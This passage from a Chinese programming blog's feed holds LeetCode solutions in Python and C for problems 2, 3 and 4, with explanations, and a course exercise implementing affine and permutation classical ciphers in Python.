class="built_in">min</span>(nums1[start1], nums2[start2]);</span><br><span class="line">    <span class="keyword">int</span> half = <span class="built_in">min</span>(n/<span class="number">2</span>,<span class="built_in">min</span>(nums1Size - start1, nums2Size - start2));</span><br><span class="line">    <span class="keyword">if</span>(nums1[start1 + half - <span class="number">1</span>] &lt; nums2[start2 + half - <span class="number">1</span>])&#123;</span><br><span class="line">        <span class="keyword">return</span> getk(nums1, nums1Size, start1 + half, nums2, nums2Size, start2, n - half);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> getk(nums1, nums1Size, start1, nums2, nums2Size, start2 + half, n - half);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">findMedianSortedArrays</span><span class="params">(<span class="keyword">int</span>* nums1, <span class="keyword">int</span> nums1Size, <span class="keyword">int</span>* nums2, <span class="keyword">int</span> nums2Size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> left = (nums1Size + nums2Size + <span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> right = (nums1Size + nums2Size + <span class="number">2</span>)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> (getk(nums1, nums1Size, <span class="number">0</span>, nums2, nums2Size, <span class="number">0</span>, left) + getk(nums1, nums1Size, <span class="number">0</span>, nums2, nums2Size, <span class="number">0</span>, right))/<span class="number">2.0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/30/1lWTWF.png" alt="1lWTWF.png"></p>
<h2 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h2><p>这道题目是一个LeetCode难度为困难的题目</p>
<p>但是单看题目会发现很简单，无非可以用到归并排序形成新数组，然后根据新数组长度的奇偶取中位数</p>
<p><strong>但是题目要求的时间复杂度为log(m+n)，而归并排序的时间复杂度为(m+n)，所以这就是这个题目的难点</strong></p>
<h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>使用二分法和递归</p>
<p>首先，我们先解决以下(m+n)的奇偶数问题，即对奇数来说中位数就是数组的第(m+n+1)/2位，而对于偶数来说，中位数就是(m+n)/2位和((m+n)/2)+1位的加和平均。其实可以将奇偶数放在一起考虑，即可以算出<code>int((m+n+1)/2)和int((m+n+2)/2)</code>的加和平均。对奇数和偶数来说都可以适用。</p>
<p>所以只要找到在两个有序数组排序组合后的第int((m+n+1)/2)个值和第int((m+n+2)/2)值就可以。</p>
<p>所以问题就划归为在两个有序数组中找第k值问题。</p>
<p>如果我们一个一个取比较，即归并排序后再去找k值，那么时间复杂度(m+n)，为了使时间复杂度为log(m+n)我们要用到二分法和递归：即我们可以一半一半的排除寻找。</p>
<h2 id="构造getk函数："><a href="#构造getk函数：" class="headerlink" title="构造getk函数："></a>构造getk函数：</h2><p>已知nums1和nums2 ，设nums = nums1 $ nums2</p>
<p>符号$的定义是<code>sorted(nums1+nums2)</code></p>
<p>示意图：</p>
<p>nums1 = [1, 3, 6, 7] </p>
<p>nums2 = [2, 4, 5, 8]</p>
<p>k = 7   k/2 = 3(向下取整)  start1 = 0        start2 = 0</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lbtts.png" alt="1lbtts.png"></p>
<p>如图 nums1[3 - 1] &gt; nums2[3 - 1]，则就可以推断2，4，5都小于nums[7-1]，即都可以舍去</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lbDnU.png" alt="1lbDnU.png"></p>
<p>k = 7 - 3 = 4    k/2 = 2  start1 = 0 start2 = 3</p>
<p>如图 nums1[2 - 1] &lt; nums2[3 + 2 - 1]，则可以判断1，3都小于nums[7-1]，即都可以舍去</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lvoHf.png" alt="1lvoHf.png"></p>
<p>k = 4 - 2    k/2 = 1    start1 = 2  start2 = 3</p>
<p>如图 nums1[2 + 1 -1] &lt; nums2[3 + 1 -1]，则可以判断6小于nums[7 - 1]，即可以舍去。</p>
<p><img src="https://s2.ax1x.com/2020/01/30/1lzJW4.png" alt="1lzJW4.png"></p>
<p>k = 2 -1 start1 = 3 start2 = 3</p>
<p>此时k = 1 即就是在两个数组中没有舍弃的数字中找到最小的数字，比较nums1[3 - 1]和nums2[3 - 1]取最小值就是我们开始要取的getk了</p>
<p>以上就是对一般情况下的求取，现在讨论特殊情况：</p>
<ol>
<li>nums1 || nums2 == none</li>
<li>len(nums1) &lt; k/2 or len(nums2) &lt; k/2</li>
<li>在递归时 k/2 &gt; len(nums1) - start1 or k/2 &gt; len(nums2) - start2</li>
</ol>
<p>其实上述可以用一种特殊情况总结，即</p>
<p><code>start1 &gt;= len(nums1) or start2 &gt;= len(nums2)</code></p>
<p><img src="https://s2.ax1x.com/2020/01/30/11VJMT.png" alt="11VJMT.png"></p>
<p>此时则<code>return nums2[start2 + k -1]</code></p>
<p>这种特殊情况总伴随者下述：</p>
<p><img src="https://s2.ax1x.com/2020/01/30/11VWod.png" alt="11VWod.png"></p>
<p>即剩下的数字不足以二分法，则此时选取最小能舍去的步数，则每次判断可舍去的步数可用如下来求取：</p>
<p><code>half = min(int(n/2),min(len(nums1)-start1,len(nums2)-start2))</code></p>
<p>使用递归来求取k位值，每次可以舍去half个值，则剩下问题就是求取剩下数组们的k-half位值，知道问题缩小到求取的值为1位，则此时就返回<code>return min(nums1[start1-1],nums2[start2-1])</code></p>
<p>其中start1和start2是变化的，即如果在上次舍去nums1数组half个值时，start1 = start1 +half，start2同理</p>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解3</title>
    <url>/2020/01/27/LeetCode%E9%A2%98%E8%A7%A33/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第3题，无重复字符的最长字串</strong></p>
<p>给定一个字符串，请你找出其中不含有重复字符的 最长子串 的长度。</p>
<blockquote>
<p>示例 1:</p>
<p>输入: “abcabcbb”<br>输出: 3<br>解释: 因为无重复字符的最长子串是 “abc”，所以其长度为 3。</p>
<p>示例 2:</p>
<p>输入: “bbbbb”<br>输出: 1<br>解释: 因为无重复字符的最长子串是 “b”，所以其长度为 1。</p>
<p>示例 3:</p>
<p>输入: “pwwkew”<br>输出: 3<br>解释: 因为无重复字符的最长子串是 “wke”，所以其长度为 3。<br>请注意，你的答案必须是 子串 的长度，”pwke” 是一个子序列，不是子串。</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(self, s)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type s: str</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> s:<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        sw = []</span><br><span class="line">        l = []</span><br><span class="line">        m = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">            <span class="keyword">if</span> i <span class="keyword">in</span> sw:</span><br><span class="line">                l.append(len(sw))</span><br><span class="line">                <span class="keyword">while</span> sw[<span class="number">0</span>] != i:</span><br><span class="line">                    sw.pop(<span class="number">0</span>)</span><br><span class="line">                sw.pop(<span class="number">0</span>)</span><br><span class="line">                sw.append(i)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                sw.append(i)</span><br><span class="line">        l.append(len(sw))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> l:</span><br><span class="line">            <span class="keyword">if</span> j &gt; m:</span><br><span class="line">                m = j</span><br><span class="line">        <span class="keyword">return</span> m</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/27/1uRWHU.png" alt="1uRWHU.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="keyword">char</span> * s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> start = <span class="number">0</span>, <span class="built_in">end</span> = <span class="number">0</span>, <span class="built_in">max</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">128</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">end</span> &lt; <span class="built_in">strlen</span>(s))&#123;</span><br><span class="line">        <span class="keyword">int</span> c = s[<span class="built_in">end</span>] - <span class="string">' '</span>;</span><br><span class="line">        <span class="keyword">while</span>(a[c]&gt;<span class="number">0</span>)&#123; <span class="comment">//表示出现重复元素</span></span><br><span class="line">            a[s[start]-<span class="string">' '</span>]--; <span class="comment">//逐个删除start表示的元素在窗口中的出现</span></span><br><span class="line">            start++;</span><br><span class="line">        &#125;</span><br><span class="line">        a[c]++;</span><br><span class="line">        <span class="built_in">end</span>++;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">end</span> - start &gt; <span class="built_in">max</span>)&#123;</span><br><span class="line">            <span class="built_in">max</span> = <span class="built_in">end</span> - start;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">end</span> -start &gt; <span class="built_in">max</span>)&#123;</span><br><span class="line">        <span class="built_in">max</span> = <span class="built_in">end</span> - start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/27/1uhG9J.png" alt="1uhG9J.png"></p>
<p><strong>解析：</strong></p>
<ol>
<li><p>原理：</p>
<p>利用滑动窗口的概念，即设置一个窗口空间，用来保存子串</p>
<p>遍历源字符串s，并加到子串中，当新加元素在子串中包含时，源子串固化成为<strong>没有重复字符的子串</strong>(不包括新加重复元素)</p>
<p>从源子串开头删到重复元素(包括重复元素)，变为新子串的前缀，并将新加元素添加到末尾</p>
<p>按照上述方式不断获取<strong>没有重复字符的子串</strong></p>
<p>即，窗口的大小在不断变化，其中窗口大小的最大值就是无重复字符的最长字串的长度</p>
</li>
<li><p>实现：</p>
<p><em>python版本</em></p>
<p>利用FIFO的队列思想来实现（利用列表的<code>append()</code>和<code>pop(0)</code>来实现）</p>
<ol>
<li><p>遍历源字符串s，将每个元素加入到队列中</p>
</li>
<li><p>当新加元素队列中重复时，先保存当前队列的大小，并与max比较，数值大者写入到max中，然后队列中队首弹出元素，直到将队列中与新加元素的重复元素弹出，将新加重复元素添加到队尾</p>
</li>
<li><p>遍历结束完源字符串s后，再将此时队列的长度与max比较，返回最大值</p>
</li>
</ol>
</li>
</ol>
<p>   <em>c语言版本</em></p>
<p>   在c语言版本中也用到了滑动窗口的思想，不过具体是用下标来实现的</p>
<ol>
<li><p>用到start和end标记窗口的前后分界</p>
</li>
<li><p>用end来遍历s，当检测出在end处的字符有在窗口中时，记录 end - start 的长度与max取最大值为max，即<code>max = MAX(max, end - start)</code> ，同时移动start到窗口中重复元素之后的一个位置</p>
<p>这里用来检测重复元素用的是数组标记法，即用长度为128(之所以128，是因为元素不只是字母，还有特殊字符)的数组保存每个元素在窗口出现的次数，下标映射关系就是 <code>下标 = s[end] - &#39; &#39;</code></p>
</li>
<li><p>最后返回max即可</p>
</li>
</ol>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>LeetCode题解2</title>
    <url>/2020/01/26/LeetCode%E9%A2%98%E8%A7%A32/</url>
    <content><![CDATA[<h1 id="LeetCode题解"><a href="#LeetCode题解" class="headerlink" title="LeetCode题解"></a>LeetCode题解</h1><p><strong>第2题，两数相加</strong></p>
<p>给出两个 非空 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 逆序 的方式存储的，并且它们的每个节点只能存储 一位 数字。</p>
<p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p>
<p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p>
<blockquote>
<p>示例：</p>
<p>输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)<br>输出：7 -&gt; 0 -&gt; 8<br>原因：342 + 465 = 807</p>
</blockquote>
<a id="more"></a>

<p>原题如上，代码如下：</p>
<p><strong>python版本</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class ListNode(object):</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.next = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        root = ListNode(<span class="number">0</span>)</span><br><span class="line">        node = root</span><br><span class="line">        carry = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span>(l1 <span class="keyword">or</span> l2):</span><br><span class="line">            x = l1.val <span class="keyword">if</span> l1 <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            y = l2.val <span class="keyword">if</span> l2 <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">            s = carry + x + y</span><br><span class="line">            carry = s // <span class="number">10</span></span><br><span class="line">            node.next = ListNode(s%<span class="number">10</span>)</span><br><span class="line">            node = node.next</span><br><span class="line">            <span class="keyword">if</span>(l1!=<span class="literal">None</span>):</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">if</span>(l2!=<span class="literal">None</span>):</span><br><span class="line">                l2 = l2.next</span><br><span class="line">        <span class="keyword">if</span>(carry&gt;<span class="number">0</span>):</span><br><span class="line">            node.next = ListNode(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> root.next</span><br></pre></td></tr></table></figure>



<p><img src="https://s2.ax1x.com/2020/01/26/1nKV5q.png" alt="1nKV5q.png"></p>
<p><strong>c语言版本</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">addTwoNumbers</span><span class="params">(struct ListNode* l1, struct ListNode* l2)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">root</span>;</span></span><br><span class="line">        root = (struct ListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct ListNode));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">node</span> = <span class="title">root</span>;</span></span><br><span class="line">        <span class="keyword">while</span> (l1 || l2)&#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">n</span> = (<span class="title">struct</span> <span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>));</span></span><br><span class="line">            n-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (l1)</span><br><span class="line">                x = l1-&gt;val;</span><br><span class="line">            <span class="keyword">if</span> (l2)</span><br><span class="line">                y = l2-&gt;val;</span><br><span class="line">            n-&gt;val = (x + y + carry)%<span class="number">10</span>;</span><br><span class="line">            carry = (x + y + carry)/<span class="number">10</span>;</span><br><span class="line">            node-&gt;next = n;</span><br><span class="line">            node = node-&gt;next;</span><br><span class="line">            <span class="keyword">if</span> (l1)&#123;</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l1 = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (l2)&#123;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                l2 = <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">n</span> = (<span class="title">struct</span> <span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">ListNode</span>));</span></span><br><span class="line">            n-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">            n-&gt;val = <span class="number">1</span>;</span><br><span class="line">            node-&gt;next = n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root-&gt;next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2020/01/26/1nKn2T.png" alt="1nKn2T.png"></p>
<p><strong>题解：</strong></p>
<p>利用链表构造</p>
<p>首先生成根节点root，并记录下来</p>
<p>逐位相加 L1 和 L2，分三种情况：</p>
<ol>
<li>在该位上，L1 和 L2 都有数值，计算值为 L1 L2 相加并模10取余，加数超过10，则进位carry为1，加入到下一位的计算中</li>
<li>在该位上，L1 有值，L2 为空，则计算值为 L1 的值</li>
<li>在该位上，L2 有值，L1 为空，则计算值为 L2 的值</li>
</ol>
<p>在结束运算时，注意关注carry的值，此时它是 L1 L2 最高位相加的进位值，若为1，则计算值要进一位</p>
<p>最后返回根节点root中的next指针</p>
]]></content>
      <categories>
        <category>LeetCode题解</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>c语言</tag>
      </tags>
  </entry>
  <entry>
    <title>古典密码</title>
    <url>/2020/01/24/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<h1 id="古典密码"><a href="#古典密码" class="headerlink" title="古典密码"></a>古典密码</h1><p>(1) 仿射密码  </p>
<p>参数选取：模数n=26+10=36 (26个字母+10个数字)，k2 = 学号后3位 mod n；k1 = 学号后4位 mod n, 若k1与n不互素，则更新k1 = k1+7 或 k1 = k1-7。</p>
<a id="more"></a>

<p><strong>代码如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line">n = <span class="number">36</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> a%b==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> gcd(b,a%b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find</span><span class="params">(x,m = n)</span>:</span> </span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> itertools.count(<span class="number">1</span>): </span><br><span class="line">        <span class="comment">#itertools.count(start,step)函数的意思是创建一个从start开始每次的步长是step的无穷序列</span></span><br><span class="line">        <span class="keyword">if</span> (x*y)%m==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> y</span><br><span class="line"> </span><br><span class="line">k1 = int(input(<span class="string">"输入学号后四位："</span>)) % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> gcd(n, k1) != <span class="number">1</span>:</span><br><span class="line">    k1 += <span class="number">7</span></span><br><span class="line">    k1 %= n</span><br><span class="line">    print(<span class="string">"k1与n不互素，更新k1:"</span>,k1)</span><br><span class="line">k2 = int(input(<span class="string">"输入学号后三位："</span>)) % n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (k1*x+k2)%n</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (find(k1)*(x-k2))%n</span><br><span class="line"></span><br><span class="line">U = &#123;<span class="string">'0'</span>:<span class="number">0</span>,<span class="string">'1'</span>:<span class="number">1</span>,<span class="string">'2'</span>:<span class="number">2</span>,<span class="string">'3'</span>:<span class="number">3</span>,<span class="string">'4'</span>:<span class="number">4</span>,<span class="string">'5'</span>:<span class="number">5</span>,<span class="string">'6'</span>:<span class="number">6</span>,<span class="string">'7'</span>:<span class="number">7</span>,<span class="string">'8'</span>:<span class="number">8</span>,<span class="string">'9'</span>:<span class="number">9</span>,<span class="string">'a'</span>:<span class="number">10</span>,<span class="string">'b'</span>:<span class="number">11</span>,<span class="string">'c'</span>:<span class="number">12</span>,<span class="string">'d'</span>:<span class="number">13</span>,<span class="string">'e'</span>:<span class="number">14</span>,<span class="string">'f'</span>:<span class="number">15</span>,<span class="string">'g'</span>:<span class="number">16</span>,<span class="string">'h'</span>:<span class="number">17</span>,<span class="string">'i'</span>:<span class="number">18</span>,<span class="string">'j'</span>:<span class="number">19</span>,<span class="string">'k'</span>:<span class="number">20</span>,<span class="string">'l'</span>:<span class="number">21</span>,<span class="string">'m'</span>:<span class="number">22</span>,<span class="string">'n'</span>:<span class="number">23</span>,<span class="string">'o'</span>:<span class="number">24</span>,<span class="string">'p'</span>:<span class="number">25</span>,<span class="string">'q'</span>:<span class="number">26</span>,<span class="string">'r'</span>:<span class="number">27</span>,<span class="string">'s'</span>:<span class="number">28</span>,<span class="string">'t'</span>:<span class="number">29</span>,<span class="string">'u'</span>:<span class="number">30</span>,<span class="string">'v'</span>:<span class="number">31</span>,<span class="string">'w'</span>:<span class="number">32</span>,<span class="string">'x'</span>:<span class="number">33</span>,<span class="string">'y'</span>:<span class="number">34</span>,<span class="string">'z'</span>:<span class="number">35</span>&#125;</span><br><span class="line">V = &#123;<span class="number">0</span>:<span class="string">'0'</span>,<span class="number">1</span>:<span class="string">'1'</span>,<span class="number">2</span>:<span class="string">'2'</span>,<span class="number">3</span>:<span class="string">'3'</span>,<span class="number">4</span>:<span class="string">'4'</span>,<span class="number">5</span>:<span class="string">'5'</span>,<span class="number">6</span>:<span class="string">'6'</span>,<span class="number">7</span>:<span class="string">'7'</span>,<span class="number">8</span>:<span class="string">'8'</span>,<span class="number">9</span>:<span class="string">'9'</span>,<span class="number">10</span>:<span class="string">'a'</span>,<span class="number">11</span>:<span class="string">'b'</span>,<span class="number">12</span>:<span class="string">'c'</span>,<span class="number">13</span>:<span class="string">'d'</span>,<span class="number">14</span>:<span class="string">'e'</span>,<span class="number">15</span>:<span class="string">'f'</span>,<span class="number">16</span>:<span class="string">'g'</span>,<span class="number">17</span>:<span class="string">'h'</span>,<span class="number">18</span>:<span class="string">'i'</span>,<span class="number">19</span>:<span class="string">'j'</span>,<span class="number">20</span>:<span class="string">'k'</span>,<span class="number">21</span>:<span class="string">'l'</span>,<span class="number">22</span>:<span class="string">'m'</span>,<span class="number">23</span>:<span class="string">'n'</span>,<span class="number">24</span>:<span class="string">'o'</span>,<span class="number">25</span>:<span class="string">'p'</span>,<span class="number">26</span>:<span class="string">'q'</span>,<span class="number">27</span>:<span class="string">'r'</span>,<span class="number">28</span>:<span class="string">'s'</span>,<span class="number">29</span>:<span class="string">'t'</span>,<span class="number">30</span>:<span class="string">'u'</span>,<span class="number">31</span>:<span class="string">'v'</span>,<span class="number">32</span>:<span class="string">'w'</span>,<span class="number">33</span>:<span class="string">'x'</span>,<span class="number">34</span>:<span class="string">'y'</span>,<span class="number">35</span>:<span class="string">'z'</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span><span class="params">()</span>:</span></span><br><span class="line">    m = input(<span class="string">"输入要加密字符串：\n"</span>)</span><br><span class="line">    c_list = []</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        c_list.append(enc(U[i]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c_list:</span><br><span class="line">        c += V[i]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">()</span>:</span></span><br><span class="line">    c = input(<span class="string">"输入要解密的字符串：\n"</span>)</span><br><span class="line">    m_list = []</span><br><span class="line">    m = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">        m_list.append(dec(U[i]))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m_list:</span><br><span class="line">        m += V[i]</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    change = input(<span class="string">"1.加密 2.解密:"</span>)</span><br><span class="line">    <span class="keyword">if</span> change == <span class="string">'1'</span>:</span><br><span class="line">        c = encryption()</span><br><span class="line">        print(<span class="string">"密文为:"</span>,c)</span><br><span class="line">    <span class="keyword">elif</span> change == <span class="string">'2'</span>:</span><br><span class="line">        m = decrypt()</span><br><span class="line">        print(<span class="string">"明文为:"</span>,m)</span><br></pre></td></tr></table></figure>

<p><strong>解析：</strong></p>
<p>​    将26个字母和10位数字映射到0-35上</p>
<p>​    加密为 (k1*x+k2)%n</p>
<p>​    解密为 ((k1^-1)*(x-k2))%n</p>
<p>(2) 置换密码</p>
<p>参数选取：分组长度为7；置换关系随机选取；</p>
<p>长度不足时后面全补填充长度。</p>
<p><strong>代码如下：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Group</span><span class="params">(m1,model)</span>:</span></span><br><span class="line">    m1_list = []</span><br><span class="line">    m1_list_new = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m1:</span><br><span class="line">        m1_list.append(i)</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">'1'</span>:</span><br><span class="line">        rules = [<span class="number">4</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> model == <span class="string">'2'</span>:</span><br><span class="line">        rules = [<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> rules:</span><br><span class="line">        m1_list_new.append(m1_list[i])</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(m1_list_new)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc_or_dec</span><span class="params">()</span>:</span></span><br><span class="line">    model = input(<span class="string">"1,加密 2,解密："</span>)</span><br><span class="line">    <span class="keyword">if</span> model == <span class="string">'1'</span>:</span><br><span class="line">        m = input(<span class="string">"输入明文字符串："</span>)</span><br><span class="line">    <span class="keyword">elif</span> model == <span class="string">'2'</span>:</span><br><span class="line">        m = input(<span class="string">"输入密文字符串："</span>)</span><br><span class="line">    patch = <span class="number">7</span> - len(m)%<span class="number">7</span></span><br><span class="line">    <span class="keyword">if</span> len(m)%<span class="number">7</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span> - len(m)%<span class="number">7</span>):</span><br><span class="line">            m += str(patch)</span><br><span class="line">    m_list= []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        m_list.append(i)</span><br><span class="line">    c = <span class="string">''</span></span><br><span class="line">    m1 = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(int(len(m)/<span class="number">7</span>)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            m1 += m_list[<span class="number">7</span>*i+j]</span><br><span class="line">        c1 = Group(m1,model)</span><br><span class="line">        m1 = <span class="string">''</span></span><br><span class="line">        c += c1</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):    </span><br><span class="line">    k = enc_or_dec()</span><br><span class="line">    print(k)</span><br></pre></td></tr></table></figure>

<p><strong>解析：</strong></p>
<p>正置换：[4,1,0,6,3,5,2]</p>
